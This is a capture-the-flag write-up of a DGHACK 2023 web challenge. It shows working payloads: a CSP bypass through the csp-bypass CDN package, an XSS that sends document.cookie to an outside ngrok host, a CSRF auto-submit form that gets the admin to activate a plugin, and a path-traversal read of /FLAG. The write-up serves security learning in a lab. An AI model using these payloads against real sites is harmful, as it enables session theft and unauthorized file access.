---
title: CTFs | DGHACK_2023 | Web | Plugin Again
author: BatBato
date: 2023-11-30
categories: [CTFs, DGHACK_2023, Web]
tags: [Web,LFI,XSS]
permalink: /CTFs/DGHACK_2023/Web/Plugin_Again
---

# Plugin Again

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/53f5fd39-d0f6-4e68-8a16-8b8df5abd9e4)

As written in the description of the challenge, we need to read the content of the `/FLAG` file. We only have access to a URL so we can navigate to the website and we get this:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/4ba20793-474c-43ec-a2ab-847529fcc4d4)

First thing I notice was that there is a menu to see which user is connected:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/539740e1-8e67-41c9-aa72-8ce96d8dc979)

Now that we know that `Johnny` and `admin` are connected, the first thing that came to my mind was `XSS`. If we can run XSS on the website, we can recover both session cookies and so, get authenticated. But if we try some basic `XSS`, we don't get any result. This is due to the [CSP](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass) located in the `meta` tag of the `HTML`:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/066a3fcf-2503-4c21-955a-9c9ac5bcf4a8)

This header tells us that we can't run `JavaScript` code except from the domain `cdn.jsdelivr.net`. This may not allow us to get our `XSS`, but after a bit of digging, I found [this](https://www.jsdelivr.com/package/npm/csp-bypass). Here we see that we can run  `JavaScript` code like the well-known `alert(1)`.

> It is recommended to run `alert(document.domain)` or `alert(window.origin)` to see if we are executing the script from the current webpage or from a sandbox. More explanation in the `LiveOverflow` video [here](https://www.youtube.com/watch?v=KHwVjzWei1c).
{: .prompt-tip}

So now we can try a basic `XSS` like this one:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/5c9e0437-ca46-4f94-8ad2-adaa59dbb0bf)


And we get the following result:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/f4cbbc45-131b-437f-800c-f87f2390073e)

As we can see, the domain is the same as our `URL`. We can now perform an `XSS` to recover a cookie. I used this really basic payload :
```html
<script src="https://cdn.jsdelivr.net/npm/csp-bypass@1.0.2/dist/sval-classic.min.js"></script>
<script src="https://unpkg.com/csp-bypass@1.0.2-0/dist/classic.js"></script>
<br csp="fetch('https://4542-195-221-38-254.ngrok-free.app?COOKIE='+document.cookie)">
```

> Don't forget to launch a python (`python3 -m http.server`) server with an `ngrok` (`ngrok http 8000`) to be able to recover the cookie.
{: .prompt-warning}

After a few seconds, we get this result:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/ff292c23-1608-4e4c-a040-f1d3f5d083b0)

We can create a cookie named `session` and set the value to the one we just got. Now we are connected as `Johnny`:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/7fcb6ba0-1c61-4cd9-9761-032d6ef53497)

After a while, I couldn't get any other cookie than the one from `Johnny`... The `admin` doesn't seem to look often the blog posts... After reading the posts on the blog, we can see a message from the `admin` talking about sending messages to other users. And now if we look at the connected users, we get a new option, we can contact them:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/52142b84-d646-4e1b-b571-7d87b1769ac3)

But when I send the cookie grabber payload (the one from earlier), I can't interact with the `admin` options because I am not on the local machine:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/dc4d1a09-ea02-4513-9e71-09cb8faee436)

So we need to find a way to ask the admin to do the work for us... If we look at the post, we find this interesting one:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/d2698fc1-adb6-41bb-a05f-b5ab3571a84f)

We then go on GitHub and search for this `JhonnyTemplater` and we find [this code](https://github.com/jhonnyCtfSysdream/JhonnyTemplater/tree/main). We notice that there is a possible `LFI` here:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/6ac5fdb6-707e-4940-84fa-0fb1ba6a0ef6)

We now reaaaaalllly want to enable this plugin. As `Johnny`, we can go to the plugin menu and see that the `activate` button redirects to `/activate-plugin/1`:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/830f7de5-ba78-4d43-99ca-8b30fd5e3863)

I tried to redirect the `admin` using `document.location` or `window.open` but without any result... I then found online some people that send a form to another user and use `JavaScript` to automatically complete it. So I used the following payload:
```html
<iframe style="display:none" name="csrf-frame"></iframe>
<form id="csrf-form" action="/activate-plugin/1" method="GET">
  <input type="submit" value="Submit request" />
</form>
<script src="https://cdn.jsdelivr.net/npm/csp-bypass@1.0.2/dist/sval-classic.min.js"></script>
<script src="https://unpkg.com/csp-bypass@1.0.2-0/dist/classic.js"></script>
<br csp="document.getElementById('csrf-form').submit()">
```

This will basically just send a form with just a submit button to the `admin` user and when he opens the message it will automatically redirect him to `/activate/1` which will activate the plugin.

> I first used `action=http://website-ybnx6z.inst.malicecyber.com/activate-plugin/1`. This worked when I sent the message to myself (`Johnny`) but not to the `admin`.
{: .prompt-warning}

We can now see that we have activated the plugin because we can deactivate it now:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/776c10a8-9a29-4494-bb02-17ba35488427)

Now, we can create a `post` with a `template`:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/f5af0a91-8745-4975-96c7-f8895b7a692f)

If we intercept the request with `BurpSuite` when we click on `Use template`, we can see this:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/b94cc400-98df-4a27-95ad-41a64a29d8a2)


We can now replace the `theme=funny` by `theme=../../../../../../../FLAG`  and now...

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/e67bc7bc-0301-4f90-addf-920e1b7509fc)

So the flag is `DGHACK{WellD0ne!Bl0ggingIsS0metimeRisky}`. 

> We could have tried to get `RCE`. Indeed, the server is using `Flask` and the `Werkzeug` console (more info [here](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug)). We could have recovered the information in the different files on the server to find the `PIN` and get `RCE` in the `Werkzeug` console.
{: .prompt-info}
